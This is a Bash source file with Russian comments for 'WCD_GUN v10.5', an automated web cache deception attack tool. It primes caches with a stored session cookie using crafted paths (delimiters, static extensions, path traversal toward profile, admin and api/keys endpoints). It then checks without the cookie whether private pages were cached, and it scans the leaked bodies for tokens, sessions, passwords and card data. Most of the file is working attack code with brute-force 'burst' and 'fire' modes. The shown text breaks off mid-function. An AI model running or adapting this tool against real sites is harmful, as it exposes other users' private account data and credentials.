#!/bin/bash
# =============================================================================
# WCD_GUN v10.5 — Web Cache Deception Automated Cannon
# Исправлено: Ctrl+C останавливает burst/fire и возвращает в меню.
# =============================================================================

set +euo pipefail
IFS=$' \t\n'

# -----------------------------------------------------------------------------
# Цвета
# -----------------------------------------------------------------------------
declare -r RED='\033[0;31m'
declare -r GREEN='\033[0;32m'
declare -r YELLOW='\033[1;33m'
declare -r CYAN='\033[0;36m'
declare -r MAGENTA='\033[0;35m'
declare -r WHITE='\033[1;37m'
declare -r BLUE='\033[0;34m'
declare -r DIM='\033[2m'
declare -r NC='\033[0m'

print_green()  { printf "${GREEN}%s${NC}\n" "$*" >&2; }
print_red()    { printf "${RED}%s${NC}\n" "$*" >&2; }
print_yellow() { printf "${YELLOW}%s${NC}\n" "$*" >&2; }
print_cyan()   { printf "${CYAN}%s${NC}\n" "$*" >&2; }
print_magenta(){ printf "${MAGENTA}%s${NC}\n" "$*" >&2; }
print_white()  { printf "${WHITE}%s${NC}\n" "$*" >&2; }
print_blue()   { printf "${BLUE}%s${NC}\n" "$*" >&2; }
print_dim()    { printf "${DIM}%s${NC}\n" "$*" >&2; }

die() {
    local msg="$1"
    local code="${2:-1}"
    print_red "[FATAL] $msg"
    print_red "Скрипт прерван (код $code). Лог: ${LOG_FILE:-отсутствует}"
    exit "$code"
}

# -----------------------------------------------------------------------------
# Глобальные переменные
# -----------------------------------------------------------------------------
LOG_FILE=""
SUCCESS_LOG=""
RAM_DIR=""
VERSION="10.5"
INTERRUPTED=false
SHOULD_QUIT=false

# -----------------------------------------------------------------------------
# Логирование
# -----------------------------------------------------------------------------
log_msg() {
    local level="$1"
    local message="$2"
    if [[ -n "$LOG_FILE" ]] && mkdir -p "$(dirname "$LOG_FILE")" 2>/dev/null; then
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] [${level}] ${message}" >> "$LOG_FILE"
    fi
    case "$level" in
        ERROR) print_red   "[!] ${message}" ;;
        WARN)  print_yellow "[*] ${message}" ;;
        INFO)  print_cyan  "[i] ${message}" ;;
        DEBUG) [[ "${VERBOSE:-false}" == "true" ]] && print_dim "[d] ${message}" ;;
        *)     print_dim    "[ ] ${message}" ;;
    esac
}

log_success() {
    local vector="$1"; local cache_level="$2"; local confidence="$3"; local auth_bypass="$4"
    local msg="${vector} → ${cache_level} (уверенность: ${confidence}%) + X-Auth-Bypass: ${auth_bypass}"
    log_msg "INFO" "УСПЕХ: ${msg}"
    if [[ -n "$SUCCESS_LOG" ]] && mkdir -p "$(dirname "$SUCCESS_LOG")" 2>/dev/null; then
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] ${msg}" >> "$SUCCESS_LOG"
    fi
}

# -----------------------------------------------------------------------------
# Инициализация окружения
# -----------------------------------------------------------------------------
init_environment() {
    SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]:-${0}}")" && pwd)" || die "Не могу определить каталог скрипта"
    PROJECT_TOOLS_DIR="$SCRIPT_DIR"

    MAGAZINE_DIR="${PROJECT_TOOLS_DIR}/magazines"
    REPORTS_DIR="${PROJECT_TOOLS_DIR}/reports"
    LOG_FILE="${PROJECT_TOOLS_DIR}/wcd_gun.log"
    SUCCESS_LOG="${PROJECT_TOOLS_DIR}/successful_vectors.log"
    COOKIE_FILE="${PROJECT_TOOLS_DIR}/cookies.txt"

    mkdir -p "$MAGAZINE_DIR" || die "Не удалось создать MAGAZINE_DIR"
    mkdir -p "$REPORTS_DIR" || die "Не удалось создать REPORTS_DIR"
    touch "$LOG_FILE" 2>/dev/null || print_yellow "Лог-файл не создан, логирование в файл отключено"
    touch "$SUCCESS_LOG" 2>/dev/null || true
    [[ -f "$COOKIE_FILE" ]] || echo "" > "$COOKIE_FILE" || print_yellow "Не удалось создать файл куки"

    RAM_DIR="/tmp/wcd_session_$$"
    mkdir -p "$RAM_DIR" || die "Не удалось создать RAM_DIR"

    TARGET_HOST="${TARGET_HOST:-localhost:8080}"
    CURL_TIMEOUT="${CURL_TIMEOUT:-5}"
    MAX_COMBINATIONS="${MAX_COMBINATIONS:-5000}"
    AGGRESSIVE="${AGGRESSIVE:-false}"
    VERBOSE="${VERBOSE:-false}"

    BURP_HOST="${BURP_HOST:-127.0.0.1}"
    BURP_PORT="${BURP_PORT:-8082}"
    USE_PROXY=false
    PROXY_STRING=""

    CURRENT_DELIMITERS_FILE=""
    CURRENT_EXTENSIONS_FILE=""
    CURRENT_STATICDIR_FILE=""
    CURRENT_ENDPOINTS_FILE=""

    CACHE_LEVEL="UNKNOWN"
    CACHE_HEADERS=""
    CACHE_CONFIDENCE=0
    CONFIRM_NOTE=""
    DIFF_LENGTH_MATCH=false
    DIFF_CONTENT_MATCH=false
    DIFF_REPORT=""

    init_magazines || print_yellow "Не все обоймы созданы"
    if [[ -f "$MAGAZINE_DIR/default.delimiters" ]]; then
        CURRENT_DELIMITERS_FILE="$MAGAZINE_DIR/default.delimiters"
        CURRENT_EXTENSIONS_FILE="$MAGAZINE_DIR/default.extensions"
        CURRENT_STATICDIR_FILE="$MAGAZINE_DIR/default.staticdir"
        CURRENT_ENDPOINTS_FILE="$MAGAZINE_DIR/default.endpoints"
    fi
}

# -----------------------------------------------------------------------------
# Очистка
# -----------------------------------------------------------------------------
cleanup() {
    local exit_code=$?
    trap - EXIT INT TERM HUP
    if [[ $exit_code -ne 0 ]]; then
        print_red "Аварийное завершение (код $exit_code)"
    else
        print_dim "Завершение работы WCD_GUN"
    fi
    pkill -TERM -P $$ 2>/dev/null || true
    sleep 0.5
    pkill -KILL -P $$ 2>/dev/null || true
    [[ -d "${RAM_DIR:-}" ]] && rm -rf "$RAM_DIR" 2>/dev/null || true
    if [[ -n "${LOG_FILE:-}" ]]; then
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] [INFO] WCD_GUN v${VERSION} завершён (код: $exit_code)" >> "$LOG_FILE" 2>/dev/null || true
    fi
    exit "$exit_code"
}

# -----------------------------------------------------------------------------
# Обоймы
# -----------------------------------------------------------------------------
init_magazines() {
    log_msg "DEBUG" "Проверка обойм..."
    mkdir -p "$MAGAZINE_DIR" 2>/dev/null || return 1
    [[ ! -f "$MAGAZINE_DIR/default.delimiters" ]] && printf ";\n?\n#\n%%3B\n%%23\n%%3F\n" > "$MAGAZINE_DIR/default.delimiters"
    [[ ! -f "$MAGAZINE_DIR/default.extensions" ]] && printf ".css\n.js\n.jpg\n.png\n.ico\n.gif\n.svg\n.woff2\n" > "$MAGAZINE_DIR/default.extensions"
    [[ ! -f "$MAGAZINE_DIR/default.staticdir" ]] && printf "/static\n/images\n/assets\n/js\n/css\n/fonts\n/files\n/uploads\n/media\n" > "$MAGAZINE_DIR/default.staticdir"
    [[ ! -f "$MAGAZINE_DIR/default.endpoints" ]] && printf "profile\naccount\nmy-account\nuser\nadmin\nsettings\ndashboard\napi/keys\n" > "$MAGAZINE_DIR/default.endpoints"
    [[ ! -f "$MAGAZINE_DIR/encoded.delimiters" ]] && printf "%%3B\n%%23\n%%3F\n" > "$MAGAZINE_DIR/encoded.delimiters"
    return 0
}

load_magazine() {
    local file="$1"
    [[ -z "$file" ]] && { return 0; }
    [[ ! -f "$file" ]] && { log_msg "ERROR" "Файл обоймы не найден: $file"; return 0; }
    grep -v '^\s*$' "$file" | grep -v '^\s*#' 2>/dev/null || true
}

get_magazine_lines() {
    local file="$1"; local output_file="$2"
    > "$output_file"
    [[ -z "$file" || ! -f "$file" ]] && return 0
    grep -v '^\s*$' "$file" | grep -v '^\s*#' > "$output_file" || true
    [[ ! -s "$output_file" ]] && echo "" > "$output_file"
}

get_magazine_label() {
    local file="$1"; local type="$2"
    [[ -z "$file" ]] && { echo "НЕ ЗАГРУЖЕНА"; return; }
    basename "$file" ".$type"
}

# -----------------------------------------------------------------------------
# Прокси и curl
# -----------------------------------------------------------------------------
build_proxy_string() {
    if [[ "$USE_PROXY" == true ]]; then
        PROXY_STRING="--proxy http://${BURP_HOST}:${BURP_PORT}"
    else
        PROXY_STRING=""
    fi
}

do_curl() {
    local url="$1"; shift
    if [[ -n "$PROXY_STRING" ]]; then
        curl -k $PROXY_STRING "$@" "$url" 2>/dev/null
    else
        curl -k --noproxy '*' "$@" "$url" 2>/dev/null
    fi
}

check_burp() {
    log_msg "DEBUG" "Проверка Burp ${BURP_HOST}:${BURP_PORT}"
    local test_code
    test_code=$(curl -s -o /dev/null -w "%{http_code}" --noproxy '*' --proxy "http://${BURP_HOST}:${BURP_PORT}" "http://detectportal.firefox.com/success.txt" 2>/dev/null | tr -d '"')
    [[ "$test_code" == "200" ]] && return 0 || return 1
}

proxy_command() {
    local action="$1"
    case "$action" in
        on)
            if check_burp; then
                USE_PROXY=true
                build_proxy_string
                print_green "[+] Прокси ВКЛЮЧЕН (${BURP_HOST}:${BURP_PORT})"
                log_msg "INFO" "Прокси включен"
            else
                print_red "[!] Burp недоступен"
                return 1
            fi ;;
        off)
            USE_PROXY=false; PROXY_STRING=""
            print_yellow "[-] Прокси ОТКЛЮЧЕН"
            log_msg "INFO" "Прокси отключен" ;;
        status)
            echo -e "${CYAN}Прокси:${NC} ${BURP_HOST}:${BURP_PORT}" >&2
            if [[ "$USE_PROXY" == true ]]; then
                print_green "  Статус: ВКЛЮЧЕН"
            else
                print_yellow "  Статус: ОТКЛЮЧЕН"
            fi ;;
        *)
            print_red "Используй: proxy on|off|status" ;;
    esac
}

# -----------------------------------------------------------------------------
# Детектор кэша (полный)
# -----------------------------------------------------------------------------
detect_cache_status() {
    local headers_file="$1"
    CACHE_LEVEL="UNKNOWN"
    CACHE_HEADERS=""
    CACHE_CONFIDENCE=0

    if [[ ! -f "$headers_file" ]]; then
        CACHE_HEADERS="(файл заголовков отсутствует)"
        return
    fi

    local x_cache=$(grep -i '^X-Cache:' "$headers_file" | awk -F': ' '{print $2}' | tr -d '\r' | head -1)
    local x_cache_status=$(grep -i '^X-Cache-Status:' "$headers_file" | awk -F': ' '{print $2}' | tr -d '\r' | head -1)
    local cf_cache=$(grep -i '^CF-Cache-Status:' "$headers_file" | awk -F': ' '{print $2}' | tr -d '\r' | head -1)
    local age=$(grep -i '^Age:' "$headers_file" | awk -F': ' '{print $2}' | tr -d '\r' | head -1)
    local via=$(grep -i '^Via:' "$headers_file" | awk -F': ' '{print $2}' | tr -d '\r' | head -1)
    local cache_control=$(grep -i '^Cache-Control:' "$headers_file" | awk -F': ' '{print $2}' | tr -d '\r' | head -1)

    local parts=()
    [[ -n "$x_cache" ]] && parts+=("X-Cache: $x_cache")
    [[ -n "$x_cache_status" ]] && parts+=("X-Cache-Status: $x_cache_status")
    [[ -n "$cf_cache" ]] && parts+=("CF-Cache-Status: $cf_cache")
    [[ -n "$age" ]] && parts+=("Age: ${age}с")
    [[ -n "$via" ]] && parts+=("Via: $via")
    [[ -n "$cache_control" ]] && parts+=("Cache-Control: $cache_control")

    CACHE_HEADERS=$( [[ ${#parts[@]} -gt 0 ]] && printf '%s | ' "${parts[@]}" | sed 's/ | $//' || echo "НЕТ КЭШ-ЗАГОЛОВКОВ" )

    local all_values="${x_cache} ${x_cache_status} ${cf_cache}"

    if echo "$cache_control" | grep -qiE 'no-cache|no-store|private|must-revalidate'; then
        CACHE_LEVEL="DYNAMIC"; CACHE_CONFIDENCE=90; return
    fi
    if echo "$all_values" | grep -qiE 'HIT|TCP_HIT|TCP_MEM_HIT'; then
        if [[ -n "$age" && "$age" -gt 0 ]] 2>/dev/null; then
            CACHE_LEVEL="HIT_STRONG"; CACHE_CONFIDENCE=95; return
        fi
        CACHE_LEVEL="HIT_WEAK"; CACHE_CONFIDENCE=65; return
    fi
    if [[ -n "$age" && "$age" -gt 0 ]] 2>/dev/null; then
        CACHE_LEVEL="HIT_WEAK"; CACHE_CONFIDENCE=55; return
    fi
    if [[ -n "$via" ]]; then
        CACHE_LEVEL="HIT_WEAK"; CACHE_CONFIDENCE=40; return
    fi
    if echo "$all_values" | grep -qiE 'MISS|TCP_MISS|TCP_MEM_MISS'; then
        CACHE_LEVEL="MISS_STRONG"; CACHE_CONFIDENCE=90; return
    fi
    if [[ -n "${all_values// }" ]]; then
        CACHE_LEVEL="MISS_WEAK"; CACHE_CONFIDENCE=30; return
    fi
    CACHE_LEVEL="UNKNOWN"; CACHE_CONFIDENCE=0
}

format_cache_level() {
    local level="$1"
    case "$level" in
        HIT_STRONG)  echo -e "${GREEN}[✓✓] HIT_STRONG${NC}" ;;
        HIT_WEAK)    echo -e "${GREEN}[✓] HIT_WEAK${NC}" ;;
        MISS_STRONG) echo -e "${RED}[✗] MISS_STRONG${NC}" ;;
        MISS_WEAK)   echo -e "${YELLOW}[?] MISS_WEAK${NC}" ;;
        DYNAMIC)     echo -e "${BLUE}[~] DYNAMIC${NC}" ;;
        UNKNOWN)     echo -e "${DIM}[ ] UNKNOWN${NC}" ;;
        *)           echo -e "${DIM}[ ] ${level}${NC}" ;;
    esac
}

confirm_cache_status() {
    local url="$1"; local retries="${2:-2}"
    local levels=()
    for i in $(seq 1 $retries); do
        sleep 0.3
        local tmp_headers="$RAM_DIR/confirm_hdr_$$_${i}.txt"
        do_curl "$url" "-s" "-o" "/dev/null" "-D" "$tmp_headers" >/dev/null 2>&1
        detect_cache_status "$tmp_headers"
        levels+=("$CACHE_LEVEL")
    done
    local strong_hits=0 weak_hits=0 misses_strong=0 misses_weak=0 dynamics=0 unknowns=0
    for l in "${levels[@]}"; do
        case "$l" in
            HIT_STRONG) strong_hits=$((strong_hits + 1)) ;;
            HIT_WEAK) weak_hits=$((weak_hits + 1)) ;;
            MISS_STRONG) misses_strong=$((misses_strong + 1)) ;;
            MISS_WEAK) misses_weak=$((misses_weak + 1)) ;;
            DYNAMIC) dynamics=$((dynamics + 1)) ;;
            *) unknowns=$((unknowns + 1)) ;;
        esac
    done
    local total=$((retries))
    local hit_total=$((strong_hits + weak_hits))
    local miss_total=$((misses_strong + misses_weak))
    if [[ $hit_total -ge $((total / 2 + 1)) ]]; then
        if [[ $strong_hits -gt 0 ]]; then CACHE_LEVEL="HIT_STRONG"; CACHE_CONFIDENCE=85
        else CACHE_LEVEL="HIT_WEAK"; CACHE_CONFIDENCE=60; fi
        CONFIRM_NOTE="подтверждено: HIT_STRONG=${strong_hits}, HIT_WEAK=${weak_hits} из ${total}"
        return
    fi
    if [[ $miss_total -ge $((total / 2 + 1)) ]]; then
        CACHE_LEVEL="MISS_STRONG"; CACHE_CONFIDENCE=85
        CONFIRM_NOTE="подтверждено: MISS_STRONG=${misses_strong}, MISS_WEAK=${misses_weak} из ${total}"
        return
    fi
    if [[ $dynamics -ge $((total / 2 + 1)) ]]; then
        CACHE_LEVEL="DYNAMIC"; CACHE_CONFIDENCE=80
        CONFIRM_NOTE="подтверждено: DYNAMIC=${dynamics} из ${total}"
        return
    fi
    CONFIRM_NOTE="нестабильно: HIT=${hit_total}, MISS=${miss_total}, DYN=${dynamics}, UNK=${unknowns} из ${total}"
}

compare_bodies() {
    local body1="$1"; local body2="$2"
    DIFF_LENGTH_MATCH=false; DIFF_CONTENT_MATCH=false; DIFF_REPORT=""
    [[ ! -f "$body1" || ! -f "$body2" ]] && { DIFF_REPORT="[!] Один из файлов тел отсутствует"; return 1; }
    local len1=$(wc -c < "$body1" | tr -d ' ')
    local len2=$(wc -c < "$body2" | tr -d ' ')
    local diff_pct=0
    [[ $len1 -gt 0 ]] && diff_pct=$(( (len1 - len2) * 100 / len1 )) && [[ $diff_pct -lt 0 ]] && diff_pct=$(( -diff_pct ))
    [[ $diff_pct -le 10 ]] && DIFF_LENGTH_MATCH=true
    local sensitive_markers=("email" "@" "profile" "account" "dashboard" "admin" "token" "session" "api" "secret" "password" "credit" "card")
    local markers_found=()
    if [[ -s "$body2" ]]; then
        for marker in "${sensitive_markers[@]}"; do
            grep -qiE "$marker" "$body2" && markers_found+=("$marker")
        done
    fi
    [[ ${#markers_found[@]} -gt 0 ]] && DIFF_CONTENT_MATCH=true
    DIFF_REPORT="Длина: poison=${len1}b probe=${len2}b (разница ${diff_pct}%)"
    $DIFF_LENGTH_MATCH && DIFF_REPORT+=" | Длины СОВПАДАЮТ" || DIFF_REPORT+=" | Длины РАЗНЫЕ"
    $DIFF_CONTENT_MATCH && DIFF_REPORT+=" | Найдены маркеры: ${markers_found[*]}"
    $DIFF_LENGTH_MATCH && $DIFF_CONTENT_MATCH && DIFF_REPORT+=" | ВЕРОЯТНАЯ УТЕЧКА!"
}

# -----------------------------------------------------------------------------
# Проверка цели и профилирование
# -----------------------------------------------------------------------------
check_target() {
    local url="${1:-$TARGET_HOST}"
    [[ -z "$url" ]] && { log_msg "ERROR" "Цель не задана"; return 1; }
    [[ "$url" != http://* && "$url" != https://* ]] && url="http://$url"
    log_msg "INFO" "Проверка цели: $url"
    local response_headers_file="$RAM_DIR/check_headers.txt"
    local http_code
    http_code=$(do_curl "$url" "-s" "-o" "/dev/null" "-D" "$response_headers_file" "-w" "%{http_code}") || {
        log_msg "ERROR" "Нет ответа от $url"; return 1; }
    if [[ "$http_code" =~ ^(200|301|302|401|403)$ ]]; then
        print_green "[+] Цель доступна (HTTP $http_code)"
        detect_cache_status "$response_headers_file"
        echo -e "  ${CYAN}Кэш-заголовки:${NC} ${YELLOW}${CACHE_HEADERS}${NC}" >&2
        echo -ne "  ${CYAN}Статус кэша:${NC}    " >&2; format_cache_level "$CACHE_LEVEL"
        return 0
    else
        log_msg "ERROR" "Цель недоступна (HTTP $http_code)"; return 1
    fi
}

profile_target() {
    local url="${1:-$TARGET_HOST}"
    [[ "$url" != http://* && "$url" != https://* ]] && url="http://$url"
    echo "" >&2
    print_cyan "╔═══════════════ ПРОФИЛИРОВАНИЕ КЭША ═══════════════╗"
    echo -e "║  Цель: ${WHITE}$url${NC}" >&2
    print_cyan "╚════════════════════════════════════════════════════╝"
    echo "" >&2
    local h1="$RAM_DIR/profile_h1.txt"; local b1="$RAM_DIR/profile_b1.txt"
    print_yellow "[1/2] Запрос С КУКОЙ..."
    local code1; code1=$(do_curl "$url" "-s" "-o" "$b1" "-D" "$h1" "-b" "$COOKIE_FILE" "-w" "%{http_code}")
    detect_cache_status "$h1"
    echo -e "  HTTP: ${code1}" >&2; echo -ne "  Кэш:  " >&2; format_cache_level "$CACHE_LEVEL"; echo "" >&2
    sleep 0.5
    local h2="$RAM_DIR/profile_h2.txt"; local b2="$RAM_DIR/profile_b2.txt"
    print_yellow "[2/2] Запрос БЕЗ КУКИ..."
    local code2; code2=$(do_curl "$url" "-s" "-o" "$b2" "-D" "$h2" "-w" "%{http_code}")
    detect_cache_status "$h2"
    echo -e "  HTTP: ${code2}" >&2; echo -ne "  Кэш:  " >&2; format_cache_level "$CACHE_LEVEL"; echo "" >&2
    compare_bodies "$b1" "$b2"
    echo -e "  ${CYAN}Сравнение:${NC} ${DIFF_REPORT}" >&2; echo "" >&2
}

validate_cookie() {
    if [[ ! -s "$COOKIE_FILE" ]]; then
        print_yellow "[*] Файл куки пуст"; return 1
    fi
    local cookie_value; cookie_value=$(<"$COOKIE_FILE")
    local url="${1:-$TARGET_HOST}"; [[ "$url" != http://* && "$url" != https://* ]] && url="http://$url"
    local http_code; http_code=$(do_curl "$url" "-s" "-o" "/dev/null" "-w" "%{http_code}" "-b" "$cookie_value")
    if [[ "$http_code" == "200" ]]; then print_green "[+] Кука валидна"; return 0
    else print_red "[!] Кука невалидна (HTTP $http_code)"; return 1; fi
}

set_target() {
    [[ -z "$1" ]] && { print_red "[!] Укажи URL"; return 1; }
    TARGET_HOST="$1"; print_green "[+] Цель: $TARGET_HOST"; log_msg "INFO" "Цель изменена на $TARGET_HOST"
    check_target
}

set_cookie() {
    [[ -z "$1" ]] && { print_red "[!] Укажи куку"; return 1; }
    echo "$1" > "$COOKIE_FILE"; print_green "[+] Кука сохранена"; log_msg "INFO" "Кука обновлена"
    validate_cookie
}

# -----------------------------------------------------------------------------
# Атакующие функции
# -----------------------------------------------------------------------------
single_shot() {
    $INTERRUPTED && return 1
    local crafted_path="$1"
    [[ -z "$crafted_path" ]] && { print_red "[!] Не указан путь"; return 1; }
    local full_url
    [[ "$crafted_path" == http://* || "$crafted_path" == https://* ]] && full_url="$crafted_path" || full_url="http://${TARGET_HOST}${crafted_path}"
    echo "" >&2
    print_cyan "═══ ОДИНОЧНЫЙ ВЫСТРЕЛ ═══"
    echo -e "  URL: ${MAGENTA}$full_url${NC}" >&2; echo "" >&2
    local poison_headers="$RAM_DIR/poison_headers.txt"; local poison_body="$RAM_DIR/poison_body.txt"
    local probe_headers="$RAM_DIR/probe_headers.txt"; local probe_body="$RAM_DIR/probe_body.txt"

    print_yellow "[1/2] Прогрев кэша (С КУКОЙ)..."
    local poison_http; poison_http=$(do_curl "$full_url" "-s" "-D" "$poison_headers" "-o" "$poison_body" "-b" "$COOKIE_FILE" "-w" "%{http_code}")
    [[ "$poison_http" == "000" ]] && { print_red "[!] Ошибка прогрева"; return 1; }
    echo -e "  HTTP: ${poison_http}" >&2
    sleep 0.3

    print_yellow "[2/2] Проверка кэша (БЕЗ КУКИ)..."
    local probe_http; probe_http=$(do_curl "$full_url" "-s" "-D" "$probe_headers" "-o" "$probe_body" "-w" "%{http_code}")
    [[ "$probe_http" == "000" ]] && { print_red "[!] Ошибка проверки"; return 1; }
    echo -e "  HTTP: ${probe_http}" >&2; echo "" >&2

    detect_cache_status "$probe_headers"
    echo -e "  ${CYAN}Кэш-статус:${NC} " >&2; format_cache_level "$CACHE_LEVEL"
    compare_bodies "$poison_body" "$probe_body"
    echo -e "  ${CYAN}Сравнение:${NC} ${DIFF_REPORT}" >&2

    if [[ "$CACHE_LEVEL" == "HIT_STRONG" || "$CACHE_LEVEL" == "HIT_WEAK" ]]; then
        print_green "  [+] ПОПАДАНИЕ!"; log_success "$crafted_path" "$CACHE_LEVEL" "$CACHE_CONFIDENCE" "N/A"; return 0
    else
        print_yellow "  [-] МИМО"; return 1
    fi
}

combo_shot() {
    local staticdir="$1"; local delimiter="$2"; local extension="$3"; local endpoint="$4"
    [[ -z "$delimiter" || -z "$endpoint" ]] && { print_red "[!] Разделитель и эндпоинт обязательны"; return 1; }
    local crafted_path
    [[ -z "$staticdir" ]] && crafted_path="/${endpoint}${delimiter}${extension}" || crafted_path="${staticdir}/../${endpoint}${delimiter}${extension}"
    echo "" >&2; print_cyan "COMBO: $crafted_path"
    single_shot "$crafted_path"
}

burst_attack() {
    echo "" >&2; print_cyan "════════════ BURST ════════════"; show_status
    get_magazine_lines "$CURRENT_STATICDIR_FILE" "$RAM_DIR/burst_staticdirs.txt"
    get_magazine_lines "$CURRENT_DELIMITERS_FILE" "$RAM_DIR/burst_delimiters.txt"
    get_magazine_lines "$CURRENT_EXTENSIONS_FILE" "$RAM_DIR/burst_extensions.txt"
    get_magazine_lines "$CURRENT_ENDPOINTS_FILE"   "$RAM_DIR/burst_endpoints.txt"
    local total=$(($(wc -l < "$RAM_DIR/burst_staticdirs.txt" | tr -d ' ')*$(wc -l < "$RAM_DIR/burst_delimiters.txt" | tr -d ' ')*$(wc -l < "$RAM_DIR/burst_extensions.txt" | tr -d ' ')*$(wc -l < "$RAM_DIR/burst_endpoints.txt" | tr -d ' ')))
    echo -e "Комбинаций: ${CYAN}$total${NC}" >&2
    [[ $total -eq 0 ]] && { print_red "[!] Нет комбинаций"; return 1; }
    local shots=0 hits=0
    INTERRUPTED=false
    while IFS= read -r endpoint; do
        $INTERRUPTED && break
        while IFS= read -r staticdir; do
            $INTERRUPTED && break
            while IFS= read -r delimiter; do
                $INTERRUPTED && break
                while IFS= read -r extension; do
                    $INTERRUPTED && break
                    ((shots++)); local path="${staticdir}/../${endpoint}${delimiter}${extension}"; path=$(echo "$path" | sed 's/\/\//\//g')
                    printf "[%d/%d] %s ... " "$shots" "$total" "$path" >&2
                    do_curl "http://${TARGET_HOST}${path}" "-s" "-o" "/dev/null" "-b" "$COOKIE_FILE" >/dev/null 2>&1; sleep 0.1
                    local hdr="$RAM_DIR/hdr_$$.txt"; do_curl "http://${TARGET_HOST}${path}" "-s" "-o" "/dev/null" "-D" "$hdr" >/dev/null 2>&1
                    detect_cache_status "$hdr"
                    if [[ "$CACHE_LEVEL" == "HIT_STRONG" || "$CACHE_LEVEL" == "HIT_WEAK" ]]; then print_green " HIT!"; ((hits++)); log_success "$path" "$CACHE_LEVEL" "$CACHE_CONFIDENCE" "N/A"
                    else echo -e "${DIM}MISS${NC}" >&2; fi
                done < "$RAM_DIR/burst_extensions.txt"
            done < "$RAM_DIR/burst_delimiters.txt"
        done < "$RAM_DIR/burst_staticdirs.txt"
    done < "$RAM_DIR/burst_endpoints.txt"
    echo "" >&2; print_green "Хитов: $hits из $shots"
    $INTERRUPTED && print_yellow "[*] Прервано пользователем."
    INTERRUPTED=false
}

fire() {
    echo "" >&2; print_cyan "════════════ FIRE ════════════"
    [[ -z "$CURRENT_DELIMITERS_FILE" || -z "$CURRENT_EXTENSIONS_FILE" ]] && { print_red "[!] Загрузи обоймы"; return 1; }
    local delims=(); local exts=()
    while IFS= read -r line; do [[ -n "$line" ]] && delims+=("$line"); done < <(load_magazine "$CURRENT_DELIMITERS_FILE" || true)
    while IFS= read -r line; do [[ -n "$line" ]] && exts+=("$line"); done < <(load_magazine "$CURRENT_EXTENSIONS_FILE" || true)
    local total=$((${#delims[@]} * ${#exts[@]}))
    [[ $total -eq 0 ]] && { print_red "[!] Нет комбинаций для fire"; return 1; }
    local shots=0 hits=0
    INTERRUPTED=false
    for d in "${delims[@]}"; do
        $INTERRUPTED && break
        for e in "${exts[@]}"; do
            $INTERRUPTED && break
            ((shots++)); local path="/${d}test${e}"; printf "[%d/%d] %s ... " "$shots" "$total" "$path" >&2
            do_curl "http://${TARGET_HOST}${path}" "-s" "-o" "/dev/null" "-b" "$COOKIE_FILE" >/dev/null 2>&1; sleep 0.1
            local hdr="$RAM_DIR/hdr_$$.txt"; do_curl "http://${TARGET_HOST}${path}" "-s" "-o" "/dev/null" "-D" "$hdr" >/dev/null 2>&1
            detect_cache_status "$hdr"
            [[ "$CACHE_LEVEL" == "HIT_STRONG" || "$CACHE_LEVEL" == "HIT_WEAK" ]] && { print_green " HIT!"; ((hits++)); } || echo -e "${DIM}MISS${NC}" >&2
        done
    done
    echo "" >&2; print_green "Хитов: $hits из $shots"
    $INTERRUPTED && print_yellow "[*] Прервано пользователем."
    INTERRUPTED=false
}

load_magazine_cmd() {
    local mag_type="$1"; local mag_name="$2"
    [[ -z "$mag_type" || -z "$mag_name" ]] && { print_red "load <тип> <имя>"; return 1; }
    local target_file="$MAGAZINE_DIR/${mag_name}.${mag_type}"
    [[ ! -f "$target_file" ]] && { print_red "Файл не найден: $target_file"; return 1; }
    case "$mag_type" in
        delimiters) CURRENT_DELIMITERS_FILE="$target_file" ;;
        extensions) CURRENT_EXTENSIONS_FILE="$target_file" ;;
        staticdir)  CURRENT_STATICDIR_FILE="$target_file" ;;
        endpoints)  CURRENT_ENDPOINTS_FILE="$target_file" ;;
        *) print_red "Неверный тип" ;;
    esac
    print_green "[+] Загружено: $mag_name"
}

add_delimiter() {
    local delim="$1"; [[ -z "$delim" ]] && return 1
    echo "$delim" >> "$CURRENT_DELIMITERS_FILE"; print_green "[+] Добавлено: $delim"
}

# -----------------------------------------------------------------------------
# СТАРТОВЫЙ МАСТЕР
# -----------------------------------------------------------------------------
start_wizard() {
    echo "" >&2
    print_cyan "═══ МАСТЕР НАСТРОЙКИ ═══"
    read -p "Загрузить дефолтные обоймы? (y/n): " yn
    if [[ "$yn" == "y" ]]; then
        CURRENT_DELIMITERS_FILE="$MAGAZINE_DIR/default.delimiters"
        CURRENT_EXTENSIONS_FILE="$MAGAZINE_DIR/default.extensions"
        CURRENT_STATICDIR_FILE="$MAGAZINE_DIR/default.staticdir"
        CURRENT_ENDPOINTS_FILE="$MAGAZINE_DIR/default.endpoints"
        print_green "[+] Загружены дефолтные обоймы"
    fi
    show_status
}

# -----------------------------------------------------------------------------
# ИНТЕРФЕЙС
# -----------------------------------------------------------------------------
show_status() {
    echo "" >&2
    print_cyan "╔═══════════════ ТЕКУЩАЯ КОНФИГУРАЦИЯ ═══════════════╗"
    printf "║ %-20s ${WHITE}%s${NC}\n" "Цель:" "$TARGET_HOST" >&2
    if [[ "$USE_PROXY" == true ]]; then
        printf "║ %-20s ${GREEN}ВКЛЮЧЕН${NC} (${BURP_HOST}:${BURP_PORT})\n" "Прокси:" >&2
    else
        printf "║ %-20s ${YELLOW}ОТКЛЮЧЕН${NC}\n" "Прокси:" >&2
    fi
    echo -ne "║ ${WHITE}Разделители:${NC}    "
    if [[ -z "$CURRENT_DELIMITERS_FILE" ]]; then echo -e "${YELLOW}НЕ ЗАГРУЖЕНЫ${NC}"
    else echo -e "${CYAN}$(get_magazine_label "$CURRENT_DELIMITERS_FILE" "delimiters")${NC}"; fi
    echo -ne "║ ${WHITE}Расширения:${NC}     "
    if [[ -z "$CURRENT_EXTENSIONS_FILE" ]]; then echo -e "${YELLOW}НЕ ЗАГРУЖЕНЫ${NC}"
    else echo -e "${CYAN}$(get_magazine_label "$CURRENT_EXTENSIONS_FILE" "extensions")${NC}"; fi
    echo -ne "║ ${WHITE}Стат. директории:${NC}"
    if [[ -z "$CURRENT_STATICDIR_FILE" ]]; then echo -e "${YELLOW}НЕ ЗАГРУЖЕНЫ${NC}"
    else echo -e "${CYAN}$(get_magazine_label "$CURRENT_STATICDIR_FILE" "staticdir")${NC}"; fi
    echo -ne "║ ${WHITE}Эндпоинты:${NC}      "
    if [[ -z "$CURRENT_ENDPOINTS_FILE" ]]; then echo -e "${YELLOW}НЕ ЗАГРУЖЕНЫ${NC}"
